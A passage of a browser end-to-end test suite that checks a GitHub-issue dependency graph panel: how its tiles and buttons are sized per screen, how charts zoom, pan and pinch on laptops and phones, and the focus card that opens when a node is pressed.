            for (const k of await shownKeys(page)) assertWhole(await stageRead(page, stageOfCard(k)), what + ' at ' + size + ', ' + key + ' shown, the chart ' + k);
          }
        }
        if (step < 8) await textTo(page, '#cp-zoom-up', 1);
      }
      assert.deepEqual(sizes, ['70%', '80%', '90%', '100%', '110%', '120%', '135%', '150%', '170%'], what + ': the text size did not step from the smallest to the largest');
    }
    console.log('     ' + line.join(' '));
    assert.deepEqual(errors, [], what);
    await context.close();
  }
});

// the height of each of a card's buttons and the tab's, read where they are shown
const buttonSizes = (page) => page.evaluate(() => {
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const h = (e) => Math.round(e.getBoundingClientRect().height * 10) / 10;
  const shown = (e) => e && getComputedStyle(e).display !== 'none' && e.getClientRects().length;
  const card = Array.from(sec.querySelectorAll('.graph__tools button')).filter(shown);
  const all = Array.from(document.querySelectorAll('#tab-dependencies button')).filter(shown).filter((b) => !b.closest('.graph__list'));
  const out = all.filter((b) => { const r = b.getBoundingClientRect(); return r.left < -1 || r.right > innerWidth + 1; }).map((b) => b.textContent || b.getAttribute('aria-label'));
  return { gbtn: getComputedStyle(document.getElementById('tab-dependencies')).getPropertyValue('--gbtn').trim(), card: card.map(h), kinds: card.map((b) => b.getAttribute('aria-label') || b.textContent), out };
});
await check('AW: the tiles and the buttons are sized from the screen: the tiles share their row\'s width, never scrolling sideways, in their full form where each has the room and a compact one where it has not, two rows where the deck is tall enough to spare one; and every button on a card is one height, larger on a larger screen and finger-sized on a phone, and none runs off the screen', async () => {
  const seen = {};
  for (const [width, height, mobile] of SCREENS) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(manyRoutes(6), { extraRoutes: [stubRoute], viewport: { width, height }, mobile });
    await signIn(page);
    await waitGraph(page, /^Drawn from 7 reads/, 15000);
    await sleep(300);
    const strip = await page.$eval('#cp-graph-focus', (s) => {
      const tiles = Array.from(s.querySelectorAll('.graph__chip')).filter((t) => !t.hidden);
      return { form: s.getAttribute('data-form'), shown: tiles.length, widths: tiles.map((t) => Math.round(t.getBoundingClientRect().width)), rows: new Set(tiles.map((t) => Math.round(t.getBoundingClientRect().top))).size,
        sideways: s.scrollWidth - s.clientWidth, paged: Array.from(s.querySelectorAll('.graph__page')).some((b) => !b.hidden) };
    });
    const sizes = await buttonSizes(page);
    seen[what] = { strip, sizes };
    console.log('     ' + what + ':', JSON.stringify(strip), JSON.stringify(sizes));
    assert.ok(strip.sideways <= 1, what + ': the tiles scroll sideways by ' + strip.sideways + ' px');
    const least = Math.min.apply(null, strip.widths);
    assert.ok(least >= GRAPH_TILE_SMALL - 1, what + ': a tile is narrower than the compact form\'s ' + GRAPH_TILE_SMALL + ' px: ' + least);
    assert.equal(strip.form, least >= GRAPH_TILE_FULL - 1 ? 'full' : 'small', what + ': the tiles\' form does not follow their width');
    assert.ok(Math.max.apply(null, strip.widths) - least <= 2, what + ': the tiles do not share their row\'s width alike');
    assert.ok(sizes.card.length >= 5 && sizes.card.every((x) => Math.abs(x - sizes.card[0]) <= 1), what + ': the card\'s buttons are not one height: ' + JSON.stringify(sizes.card));
    assert.deepEqual(sizes.out, [], what + ': a button runs off the screen');
    if (mobile) assert.ok(sizes.card[0] >= 32, what + ': the card\'s buttons are smaller than a finger: ' + sizes.card[0]);
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  assert.ok(seen['1920 x 1080'].sizes.card[0] >= seen['1280 x 800'].sizes.card[0] + 3, 'the buttons are no larger on the monitor than on the laptop');
  assert.ok(seen['1920 x 1080'].strip.form === 'full' && seen['1280 x 800'].strip.form === 'small', 'the tiles take one form on the laptop and the monitor, so the form says nothing');
  // a goal and twenty-four epics: two rows on the monitor, whose deck can spare one, and a page at a
  // time in one row on a short laptop window, whose deck cannot; 1366 x 680, since at 1366 x 768 the
  // tab is 720 px tall, over the 640 that spares a row (since 2026-10-20 the foot and the Ask Claude bar are gone and the tab takes the window's height but for its head)
  for (const [width, height, rows] of [[1920, 1080, 2], [1366, 680, 1]]) {
    const { context, page, errors } = await open(manyRoutes(24), { extraRoutes: [stubRoute], viewport: { width, height } });
    await signIn(page);
    await waitGraph(page, /^Drawn from 25 reads/, 15000);
    await sleep(300);
    const strip = await page.$eval('#cp-graph-focus', (s) => {
      const tiles = Array.from(s.querySelectorAll('.graph__chip')).filter((t) => !t.hidden);
      return { tiles: s.querySelectorAll('.graph__chip').length, shown: tiles.length, rows: new Set(tiles.map((t) => Math.round(t.getBoundingClientRect().top))).size, least: Math.min.apply(null, tiles.map((t) => Math.round(t.getBoundingClientRect().width))),
        sideways: s.scrollWidth - s.clientWidth, paged: Array.from(s.querySelectorAll('.graph__page')).some((b) => !b.hidden), tab: document.getElementById('tab-dependencies').clientHeight };
    });
    console.log('     a goal and twenty-four epics at ' + width + ' x ' + height + ':', JSON.stringify(strip));
    assert.deepEqual([strip.tiles, strip.rows, strip.sideways <= 1], [26, rows, true], width + ' x ' + height + ': the tiles are not in ' + rows + ' row(s) that never scroll');
    if (rows === 2) assert.deepEqual([strip.shown, strip.paged], [26, false], 'the monitor does not show every tile on its two rows');
    else assert.ok(strip.paged && strip.shown < 26, 'the laptop shows every tile on one row with no pages');
    assert.ok(strip.least >= GRAPH_TILE_SMALL - 1, 'a tile is narrower than the compact form: ' + strip.least);
    assert.deepEqual(errors, []);
    await context.close();
  }
});

await check('AX: each chart opens whole at most at its own size, centred: a chart smaller than its stage at exactly its own size and never enlarged, a larger one shrunk until it meets its stage\'s padding, on a laptop and on a phone', async () => {
  for (const [width, height, mobile] of [[1366, 768], [390, 844, true]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(manyRoutes(3, true), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 4 reads/, 30000);
    await sleep(300);
    const seen = {};
    for (const key of ['goals', 'epic-100', 'epic-200', 'epic-300']) {
      await pick(page, key);
      await sleep(250);
      const s = await stageRead(page);
      assertWhole(s, what + ', ' + key);
      seen[key] = { k: Math.round(s.k * 1000) / 1000, size: [Math.round(s.w), Math.round(s.h)], box: s.box };
    }
    console.log('     ' + what + ':', JSON.stringify(seen));
    // epic #100's one task is smaller than any stage; epic #200's twelve side by side wider than any
    assert.ok(seen['epic-100'].size[0] < seen['epic-100'].box[0] - 24 && seen['epic-100'].size[1] < seen['epic-100'].box[1] - 24, what + ': the one-task chart is not smaller than its stage, so this says nothing');
    assert.equal(seen['epic-100'].k, 1, what + ': a chart smaller than its stage was not drawn at its own size');
    assert.ok(seen['epic-200'].k < 1, what + ': the wide chart was not shrunk to its stage');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
});

// the zoom's controls on the card shown
const ZOOM_IN = '#cp-graph .graph__section:not([hidden]) button.graph__zbtn[aria-label="Zoom in"]';
const ZOOM_OUT = '#cp-graph .graph__section:not([hidden]) button.graph__zbtn[aria-label="Zoom out"]';
const STAGE_SHOWN = '#cp-graph .graph__section:not([hidden]) .control__chart';
const near1 = (a, b, e) => Math.abs(a - b) <= (e || 1e-3);
await check('AY: a chart zooms by the wheel and by the trackpad\'s pinch about the pointer, the node under it staying there, by + and - on the card and on the keys about its middle, back whole by 0, and in twice about a node by a double click that opens no focus; never past its whole view outward nor past three times its size inward, a double click there drawing it whole again; and the page never scrolls', async () => {
  const { context, page, errors } = await open(wideRoutes(), { viewport: { width: 1366, height: 768 } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 1 read/, 15000);
  // every turn of the wheel over the stage, and whether the stage kept it from the page, read after
  // the page's own listeners: a turn the zoom takes and lets through would scroll the page too,
  // wherever the page scrolls as a whole
  await page.evaluate(() => { window.__wheels = []; window.addEventListener('wheel', (e) => { if (e.target.closest && e.target.closest('.control__chart')) window.__wheels.push(e.defaultPrevented); }); });
  await sleep(300);
  const whole = await stageRead(page);
  assertWhole(whole, 'the wide chart');
  const fit = whole.k;
  // the mouse's wheel, a notch in, about the node under the pointer
  const a = await nodeAt(page, 74);
  await page.mouse.move(a.x, a.y);
  await page.mouse.wheel(0, -100);
  await sleep(200);
  const wheeled = await stageRead(page), a1 = await nodeAt(page, 74);
  // the trackpad's pinch, which the browser sends as the wheel with ctrl held
  await page.keyboard.down('Control');
  await page.mouse.wheel(0, -30);
  await page.keyboard.up('Control');
  await sleep(200);
  const pinched = await stageRead(page), a2 = await nodeAt(page, 74);
  const still = await panState(page);
  // the card's buttons, then the keys with the stage holding the keyboard
  await page.click(ZOOM_IN);
  await sleep(350);
  const plus = await stageRead(page);
  await page.click(ZOOM_OUT);
  await sleep(350);
  const minus = await stageRead(page);
  await page.focus(STAGE_SHOWN);
  await page.keyboard.press('+');
  await sleep(350);
  const keyPlus = await stageRead(page);
  await page.keyboard.press('-');
  await sleep(350);
  const keyMinus = await stageRead(page);
  await page.keyboard.press('0');
  await sleep(350);
  const keyZero = await stageRead(page);
  await page.keyboard.press('-');
  await sleep(350);
  const pastOut = await stageRead(page);
  // a double click on a node: in twice about it, and no focus opened
  const b = await nodeAt(page, 78);
  await page.mouse.dblclick(b.x, b.y);
  await sleep(600);
  const dbl = await stageRead(page), b1 = await nodeAt(page, 78), dblNear = await nearRead(page);
  // the bounds: the wheel far out stops at the whole view; far in, and + after it, at three times
  await page.mouse.wheel(0, 3000);
  await sleep(200);
  const out = await stageRead(page);
  const outButton = await wholeButton(page);
  for (let i = 0; i < 3; i++) { await page.mouse.wheel(0, -3000); await sleep(100); }
  await sleep(200);
  const most = await stageRead(page);
  await page.click(ZOOM_IN);
  await sleep(350);
  const pastIn = await stageRead(page);
  const c = await stageMid(page);
  await page.mouse.dblclick(c.x, c.y);
  await sleep(600);
  const dblAtMost = await stageRead(page);
  const end = await panState(page);
  console.log('     whole:', fit, '| the wheel:', wheeled.k, JSON.stringify([a, a1].map((q) => [q.x, q.y].map(Math.round))), '| ctrl and the wheel:', pinched.k, JSON.stringify([a2.x, a2.y].map(Math.round)), '| + and -:', plus.k, minus.k, '| keys + - 0 -:', keyPlus.k, keyMinus.k, keyZero.k, pastOut.k,
    '| a double click:', dbl.k, JSON.stringify([b, b1].map((q) => [q.x, q.y].map(Math.round))), dblNear.open, '| far out:', out.k, outButton.idle, '| far in:', most.k, pastIn.k, '| a double click at the most:', dblAtMost.k, '| the page:', JSON.stringify([still.top, still.win, end.top, end.win]));
  assert.ok(fit < 1, 'the wide chart is not shrunk to its stage, so this says nothing');
  assert.ok(near1(wheeled.k / fit, Math.exp(0.2)), 'a notch of the wheel did not zoom in: ' + wheeled.k);
  // both ways, since a node the layout puts at the stage's middle one way stays there that way
  // whatever point the zoom is about
  const stayed = (p, q) => Math.abs(q.x - p.x) <= 1.5 && Math.abs(q.y - p.y) <= 1.5;
  assert.ok(stayed(a, a1), 'the node under the pointer moved with the wheel: ' + JSON.stringify([a, a1]));
  assert.ok(near1(pinched.k / wheeled.k, Math.exp(0.3)), 'the trackpad\'s pinch did not zoom in: ' + pinched.k);
  assert.ok(stayed(a, a2), 'the node under the pointer moved with the trackpad\'s pinch: ' + JSON.stringify([a, a2]));
  assert.ok(near1(plus.k / pinched.k, 1.4) && near1(minus.k, pinched.k), 'the card\'s + and - did not zoom in and out: ' + JSON.stringify([pinched.k, plus.k, minus.k]));
  assert.ok(near1(keyPlus.k / minus.k, 1.4) && near1(keyMinus.k, minus.k), 'the keys + and - did not zoom in and out');
  assert.ok(near1(keyZero.k, fit, 1e-6), 'the key 0 did not draw the chart whole');
  assertWhole(keyZero, 'the chart after the key 0');
  assert.ok(near1(pastOut.k, fit, 1e-6), 'the key - zoomed out past the whole view');
  assert.ok(near1(dbl.k, 2 * fit), 'a double click did not zoom in twice: ' + dbl.k);
  assert.ok(stayed(b, b1), 'the node double clicked moved: ' + JSON.stringify([b, b1]));
  assert.equal(dblNear.open, false, 'a double click on a node opened it in focus');
  assert.ok(near1(out.k, fit, 1e-6) && out.k > 0, 'the wheel far out did not stop at the whole view: ' + out.k);
  assertWhole(out, 'the chart after the wheel far out');
  assert.equal(outButton.idle, true, 'Whole chart is lit on a chart drawn whole');
  assert.ok(near1(most.k, 3, 1e-6) && near1(pastIn.k, 3, 1e-6), 'the zoom went past three times the chart\'s size, or stopped short: ' + JSON.stringify([most.k, pastIn.k]));
  assert.ok(near1(dblAtMost.k, fit, 1e-6), 'a double click at the most did not draw the chart whole again');
  assert.deepEqual([still.top, still.win, end.top, end.win], [0, 0, 0, 0], 'the page or the tab scrolled');
  const wheels = await page.evaluate(() => window.__wheels);
  assert.ok(wheels.length >= 5 && wheels.every(Boolean), 'a turn of the wheel the stage took was let through to the page: ' + JSON.stringify(wheels));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('AZ: a chart zoomed in pans by the arrow keys, 60 px a press, and by one finger on a phone as far as the finger goes, each kept within its edges, while the keys that scroll a box scroll nothing, and the page never moves', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1280, height: 800 } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await zoomedEpic(page);
  await page.focus(STAGE_SHOWN);
  const press = async (key, times) => { for (let i = 0; i < times; i++) await page.keyboard.press(key); await sleep(400); };
  // the keys a box that scrolls answers by itself, which this stage leaves alone: its picture moves
  // by the arrows alone, so the stage itself never scrolls under it
  // each read after its own key, since Shift and Space scroll back what Space scrolled; and every
  // scroll of a stage is read as it comes, before the stage's own listener puts back one the browser
  // made to show a button given the keyboard, so a scroll the keys made is seen for its moment too
  await page.evaluate(() => { window.__stageScrolls = []; document.addEventListener('scroll', (e) => { const t = e.target; if (t instanceof Element && t.classList.contains('control__chart') && (t.scrollLeft || t.scrollTop)) window.__stageScrolls.push([t.scrollLeft, t.scrollTop]); }, true); });
  const unscrolled = await panState(page), byKey = [];
  for (const key of ['PageDown', 'End', 'Space', 'Shift+Space']) { await press(key, 1); byKey.push(await panState(page)); }
  const scrolledBy = await page.evaluate(() => window.__stageScrolls);
  console.log('     the keys a scrolling box takes:', JSON.stringify(byKey.map((s) => s.stage)), JSON.stringify([unscrolled.x, unscrolled.y].concat(byKey.map((s) => [s.x, s.y]))), '| the stage scrolled for a moment:', JSON.stringify(scrolledBy));
  assert.deepEqual(byKey.map((s) => s.stage), [[0, 0], [0, 0], [0, 0], [0, 0]], 'the keys of a scrolling box scrolled the stage');
  assert.deepEqual(scrolledBy, [], 'the keys of a scrolling box scrolled the stage, if only until it was put back');
  assert.deepEqual(byKey.map((s) => [s.x, s.y, s.top, s.win]), byKey.map(() => [unscrolled.x, unscrolled.y, 0, 0]), 'the keys of a scrolling box moved the chart, the tab or the page');
  await press('ArrowLeft', 20);
  await press('ArrowUp', 20);
  const corner = await stageRead(page), at = await panState(page);
  await press('ArrowRight', 1);
  await press('ArrowDown', 1);
  const stepped = await panState(page);
  await press('ArrowRight', 20);
  await press('ArrowDown', 20);
  const far = await stageRead(page), last = await panState(page);
  const keyEdges = [corner.pic.l - corner.inner.l, corner.pic.t - corner.inner.t, far.inner.r - far.pic.r, far.inner.b - far.pic.b].map(Math.round);
  console.log('     the keys: at the top left', JSON.stringify([at.x, at.y]), '| a press right and down', JSON.stringify([stepped.x, stepped.y]), '| edges:', JSON.stringify(keyEdges), '| the chart shown:', last.near, JSON.stringify([last.top, last.win]));
  assert.deepEqual(keyEdges, [12, 12, 12, 12], 'the arrow keys took the chart past its edges, or stopped short of them');
  assert.ok(near1(stepped.x, at.x - 60, 0.5) && near1(stepped.y, at.y - 60, 0.5), 'a press of the arrow keys did not move the chart 60 px: ' + JSON.stringify([at, stepped]));
  assert.deepEqual(await chosen(page), { pressed: 'epic-20', shown: 'epic-20' }, 'an arrow key on a chart zoomed in stepped to another chart');
  assert.deepEqual([last.top, last.win], [0, 0]);
  assert.deepEqual(errors, []);
  await context.close();
  // a phone: one finger drags the chart zoomed in, both ways, as far as it goes
  const phone = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true });
  await signIn(phone.page);
  await phone.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(phone.page, /^Drawn from 4 reads/, 15000);
  const cdp = await phone.context.newCDPSession(phone.page);
  // a phone's card has no zoom buttons, so two fingers spread the chart to three times its size
  await pick(phone.page, 'epic-20');
  await sleep(300);
  await pinch(cdp, await stageMid(phone.page), 50, 250);
  const spread = await stageRead(phone.page);
  assert.ok(near1(spread.k, 3, 1e-6) && spread.inner.r - 12 - spread.pic.r <= -55 && spread.inner.b - 12 - spread.pic.b <= -35, 'the chart spread by two fingers has no room to move inside its stage both ways: ' + JSON.stringify([spread.k, spread.box]));
  const r = await freeSpot(phone.page);
  assert.ok(r, 'no spot of the stage is free of nodes');
  const before = await panState(phone.page);
  await swipe(cdp, r, { x: r.x - 50, y: r.y - 30 }, 8);
  const dragged = await panState(phone.page);
  // dragged again and again towards each corner, from inside the stage, until it stops
  for (let i = 0; i < 6; i++) await swipe(cdp, r, { x: r.x + 220, y: r.y + 220 }, 8);
  const topLeft = await stageRead(phone.page);
  for (let i = 0; i < 6; i++) await swipe(cdp, { x: r.x + 220, y: r.y + 220 }, r, 8);
  const bottomRight = await stageRead(phone.page), after = await panState(phone.page);
  const edges = [topLeft.pic.l - topLeft.inner.l, topLeft.pic.t - topLeft.inner.t, bottomRight.inner.r - bottomRight.pic.r, bottomRight.inner.b - bottomRight.pic.b].map(Math.round);
  console.log('     a finger: before', JSON.stringify(before), '| dragged', JSON.stringify(dragged), '| edges:', JSON.stringify(edges), '| after:', JSON.stringify(after));
  assert.ok(Math.abs(dragged.x - before.x + 50) <= 2 && Math.abs(dragged.y - before.y + 30) <= 2, 'the chart did not follow the finger both ways: ' + JSON.stringify([before, dragged]));
  assert.deepEqual(edges, [12, 12, 12, 12], 'the finger took the chart past its edges, or it stopped short of them');
  assert.deepEqual([after.win, after.near, after.tab], [before.win, false, '#dependencies'], 'the finger moved the page or pressed a node');
  assert.deepEqual(await chosen(phone.page), { pressed: 'epic-20', shown: 'epic-20' }, 'the finger on a chart zoomed in stepped to another chart');
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
});

await check('BA: two fingers pinch a chart on a phone: spread, it zooms in about the point between them, which stays under them, up to three times its size; closed, it goes back whole, and from a focus, back to the whole chart; and the page never zooms or moves', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(400);
  const cdp = await context.newCDPSession(page);
  const whole = await stageRead(page), win = await panState(page);
  assertWhole(whole, 'the chart on a phone');
  // spread about the picture's middle, then closed a little about a point off it, the picture by
  // then larger than the stage both ways: the point of the picture between the fingers stays there,
  // read as a share of the picture's width and height
  const share = (s, p) => [(p.x - s.pic.l) / (s.pic.r - s.pic.l), (p.y - s.pic.t) / (s.pic.b - s.pic.t)];
  const mid = { x: (whole.pic.l + whole.pic.r) / 2, y: (whole.pic.t + whole.pic.b) / 2 };
  await pinch(cdp, mid, 60, 180);
  const spread = await stageRead(page);
  // the browser's own zoom of the page, which the stage keeps the fingers from
  const spreadScale = await page.evaluate(() => window.visualViewport ? window.visualViewport.scale : 1);
  assert.ok(near1(spread.k / whole.k, 3, 0.02) && spreadScale === 1, 'two fingers spread from 60 to 180 px did not zoom the chart in three times, or zoomed the page: ' + JSON.stringify([spread.k / whole.k, spreadScale]));
  const off = { x: spread.inner.l + 0.3 * (spread.inner.r - spread.inner.l), y: spread.inner.t + 0.6 * (spread.inner.b - spread.inner.t) };
  // closed from 180 to 170 px, so the picture still covers the phone's stage, which is taller since
  // the foot and the Ask Claude bar went on 2026-10-20 (from 180 to 150 it now leaves the stage's
  // foot bare, and then the point under the fingers is held only as far as the picture may move)
  await pinch(cdp, off, 180, 170);
  const offPinched = await stageRead(page);
  const covers = (s) => s.pic.l < s.inner.l + 11 && s.pic.r > s.inner.r - 11 && s.pic.t < s.inner.t + 11 && s.pic.b > s.inner.b - 11;
  await pinch(cdp, mid, 40, 300);
  const most = await stageRead(page);
  await pinch(cdp, mid, 300, 40);
  const closed = await stageRead(page);
  // a node tapped opens in focus; two fingers closed on the focus go back to the whole chart
  const n = await nodeAt(page, 22);
  await page.touchscreen.tap(n.x, n.y);
  await waitNear(page, 22);
  await sleep(300);
  const focus = await stageRead(page);
  await pinch(cdp, await stageMid(page), 60, 150);
  const focusSpread = await stageRead(page), stillNear = await nearRead(page);
  await pinch(cdp, await stageMid(page), 260, 40);
  const back = await nearRead(page), backStage = await stageRead(page), end = await panState(page);
  const scale = await page.evaluate(() => window.visualViewport ? window.visualViewport.scale : 1);
  console.log('     whole:', whole.k, '| spread 60 to 180:', spread.k, JSON.stringify([share(whole, mid), share(spread, mid)].map((x) => x.map((v) => Math.round(v * 1000) / 1000))), '| closed 180 to 170 off the middle:', offPinched.k, covers(offPinched), JSON.stringify([share(spread, off), share(offPinched, off)].map((x) => x.map((v) => Math.round(v * 1000) / 1000))), '| spread far:', most.k, '| closed:', closed.k,
    '| focus:', focus.k, '| spread on the focus:', focusSpread.k, stillNear.open, '| closed on the focus:', JSON.stringify([back.open, back.whole, backStage.k]), '| the page:', JSON.stringify([win.win, end.win, scale]));
  share(whole, mid).forEach((v, i) => assert.ok(Math.abs(v - share(spread, mid)[i]) <= 0.01, 'the point between the fingers moved as they spread'));
  assert.ok(covers(offPinched) && near1(offPinched.k / spread.k, 170 / 180, 0.02), 'the fingers closed a little did not zoom out a little, or the picture no longer covers the stage, so this says nothing: ' + JSON.stringify([spread.k, offPinched.k]));
  share(spread, off).forEach((v, i) => assert.ok(Math.abs(v - share(offPinched, off)[i]) <= 0.01, 'the point between the fingers moved as they closed: ' + JSON.stringify([share(spread, off), share(offPinched, off)])));
  assert.ok(near1(most.k, 3, 1e-6), 'the pinch zoomed past three times the chart\'s size, or stopped short: ' + most.k);
  assert.ok(near1(closed.k, whole.k, 1e-6), 'two fingers closed did not draw the chart whole again: ' + closed.k);
  assertWhole(closed, 'the chart after the fingers closed');
  assert.ok(focusSpread.k > focus.k * 1.2 && stillNear.open, 'the pinch did not zoom the focus in, or closed it');
  assert.deepEqual([back.open, back.whole], [false, true], 'two fingers closed on a focus did not go back to the whole chart');
  assertWhole(backStage, 'the chart after the focus closed');
  assert.deepEqual([end.win, scale], [win.win, 1], 'the pinch moved or zoomed the page');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BB: a node pressed opens in focus: the node and the issues one arrow away from it, and only those, drawn larger, a quarter larger at the least, whole where that fits and else about the node, the node marked; its card with its number, state, worker, whole title, its arrows in words, a link to it on GitHub that opens a new tab, and Centre its row for the Tasks tab; a node no arrow joins says so; on a laptop and on a phone held either way', async () => {
  const f = fixture();
  for (const [width, height, mobile] of [[1366, 768], [390, 844, true], [844, 390, true]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(fixtureRoutes(f), { viewport: { width, height }, mobile, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 4 reads/, 15000);
    await sleep(300);
    const press = async (n) => { const p = await nodeAt(page, n); if (mobile) await page.touchscreen.tap(p.x, p.y); else await page.mouse.click(p.x, p.y); await waitNear(page, n); await sleep(300); };
    // the node's box in the whole chart, then in its focus, where it comes up larger, and on a
    // phone the tiles and the card's heading give way to it
    const whole = await stageRead(page), w22 = whole.nodes.find((g) => g.n === 22);
    await press(22);
    const at22 = await nearRead(page), s22 = await stageRead(page), f22 = s22.nodes.find((g) => g.n === 22);
    const roomy = await page.evaluate(() => {
      const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
      return [getComputedStyle(document.getElementById('cp-graph-focus')).display, sec.querySelector('.graph__head h3').getBoundingClientRect().height];
    });
    // a neighbour pressed in the focus moves the focus to it
    await press(23);
    const at23 = await nearRead(page), s23 = await stageRead(page);
    const cardIn = await page.evaluate(() => {
      const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), c = sec.querySelector('.graph__near').getBoundingClientRect(), t = document.getElementById('tab-dependencies').getBoundingClientRect();
      return c.left >= t.left - 1 && c.right <= t.right + 1 && c.top >= t.top - 1 && c.bottom <= t.bottom + 1;
    });
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
    await sleep(400);
    const back = await page.evaluate(() => [getComputedStyle(document.getElementById('cp-graph-focus')).display, Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.graph__head h3').getBoundingClientRect().height]);
    const grew = (f22.r - f22.l) / (w22.r - w22.l);
    console.log('     ' + what + ': #22', JSON.stringify(at22), s22.k, '| #22 drawn', Math.round(100 * grew) / 100, 'times as wide as in the whole chart | the tiles and the heading in focus:', JSON.stringify(roomy), 'and back:', JSON.stringify(back), '| #23', JSON.stringify(at23), s23.k, '| the card inside the tab:', cardIn);
    assert.deepEqual([at22.open, at22.whole, at22.nodes, at22.focal, at22.edges], [true, false, [22, 23, 99], [22], 2], what + ': #22\'s focus does not draw it and its neighbours alone');
    assert.deepEqual([at22.num, at22.state, at22.worker, at22.title, at22.rel], ['#22', 'claimed', 'worker alice', 'Render the section', 'Blocked by #99; blocks #23.'], what + ': #22\'s card does not say what it is');
    assert.deepEqual([at22.link, at22.button], [['Open #22 on GitHub', 'https://github.com/acme/demo/issues/22', '_blank', 'noopener'], 'Centre its row'], what + ': #22\'s card has no link to it or no Centre its row');
    assertFocus(s22, what + ', #22\'s focus', whole.k);
    assert.ok(s22.near && grew > 1.1, what + ': the node pressed is not drawn larger in its focus than in the whole chart: ' + Math.round(100 * grew) / 100);
    if (mobile) {
      assert.deepEqual([roomy[0], roomy[1] <= 1], ['none', true], what + ': on a phone the tiles or the card\'s heading keep their room from the focus');
      // held sideways the tab is short, and the heading stays a reader's alone (graph--short)
      assert.ok(back[0] !== 'none' && (height <= 520 || back[1] > 1), what + ': the tiles or the card\'s heading did not come back with the whole chart');
    } else assert.ok(roomy[0] !== 'none' && roomy[1] > 1, what + ': on a laptop the focus hid the tiles or the card\'s heading');
    assert.deepEqual([at23.nodes, at23.focal, at23.title, at23.titleCut, at23.rel], [[21, 22, 23], [23], 'Write the body | with "quotes" and <tags> #5 and a title long enough to be cut short', false, 'Blocked by #22; blocked by #21, now closed.'], what + ': #23\'s focus or its whole title is not shown');
    assertFocus(s23, what + ', #23\'s focus', whole.k);
    assert.equal(cardIn, true, what + ': the focus\'s card runs out of the tab');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  // an epic of one task no arrow joins
  const routes = baseRoutes('acme/demo', [issue(40, 'Alone', ['epic'], subs(0, 1)), issue(41, 'Stand alone', ['todo'])]);
  routes['GET /repos/acme/demo/issues/40/sub_issues'] = [issue(41, 'Stand alone', ['todo'])];
  const lone = await open(routes, { viewport: { width: 1366, height: 768 } });
  await signIn(lone.page);
  await lone.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(lone.page, /^Drawn from 1 read/, 15000);
  await sleep(300);
  const p = await nodeAt(lone.page, 41);
  await lone.page.mouse.click(p.x, p.y);
  await waitNear(lone.page, 41);
  const alone = await nearRead(lone.page);
  console.log('     a node no arrow joins:', JSON.stringify(alone));
  assert.deepEqual([alone.nodes, alone.edges, alone.title, alone.rel], [[41], 0, 'Stand alone', 'No arrow joins it to another issue in this chart.']);
  assert.deepEqual(lone.errors, []);
  await lone.context.close();
  // a title of 170 characters, in focus on a phone held sideways, where the tab is short and the
  // card stands beside the stage: whole, with its link and Centre its row inside the card
  const long = issue(51, MANY_TITLES[2], ['todo']), next = issue(52, 'Short one', ['todo'], deps(1, 1));
  const longRoutes = baseRoutes('acme/demo', [issue(50, 'Long', ['epic'], subs(0, 2)), long, next]);
  longRoutes['GET /repos/acme/demo/issues/50/sub_issues'] = [long, next];
  longRoutes['GET /repos/acme/demo/issues/52/dependencies/blocked_by'] = [long];
  const side = await open(longRoutes, { viewport: { width: 844, height: 390 }, mobile: true });
  await signIn(side.page);
  await side.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(side.page, /^Drawn from 2 reads/, 15000);
  await sleep(300);
  const q = await nodeAt(side.page, 51);
  await side.page.touchscreen.tap(q.x, q.y);
  await waitNear(side.page, 51);
  await sleep(300);
  const longNear = await nearRead(side.page);
  const acts = await side.page.evaluate(() => {
    const c = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden).querySelector('.graph__near'), r = c.getBoundingClientRect(), a = c.querySelector('.graph__nearacts').getBoundingClientRect();
    return { short: document.getElementById('tab-dependencies').classList.contains('graph--short'), inside: a.bottom <= r.bottom + 1 };
  });
  console.log('     a long title on a phone held sideways:', JSON.stringify([longNear.titleCut, acts]));
  assert.equal(acts.short, true, 'the tab is not short on a phone held sideways, so this says nothing');
  assert.deepEqual([longNear.title, longNear.titleCut, acts.inside], [MANY_TITLES[2], false, true], 'a long title is cut short in focus on a phone held sideways, or its card\'s buttons run out of it');
  assert.deepEqual(side.errors, []);
  await side.context.close();
});

